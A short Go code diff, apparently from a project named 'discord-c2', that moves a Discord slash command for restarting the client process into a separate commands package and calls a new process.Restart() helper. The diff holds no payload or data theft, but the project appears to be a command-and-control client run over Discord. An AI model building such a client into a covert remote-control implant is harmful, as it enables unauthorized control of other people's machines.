@@ -1,9 +1,13 @@
-package main
+package commands
 
 // This file contains control-style slash commands such as restarting the
 // client process.
 
-import "github.com/bwmarrin/discordgo"
+import (
+	"discord-c2/internal/process"
+
+	"github.com/bwmarrin/discordgo"
+)
 
 // handleSlashRestart triggers a local restart of the client process and reports
 // success or failure back to the channel.
@@ -15,7 +19,7 @@ func handleSlashRestart(s *discordgo.Session, i *discordgo.InteractionCreate) {
 			Flags:   discordgo.MessageFlagsEphemeral,
 		},
 	})
-	err := restartClient()
+	err := process.Restart()
 	if err != nil {
 		s.ChannelMessageSend(i.ChannelID, "Restart failed: "+err.Error())
 	}
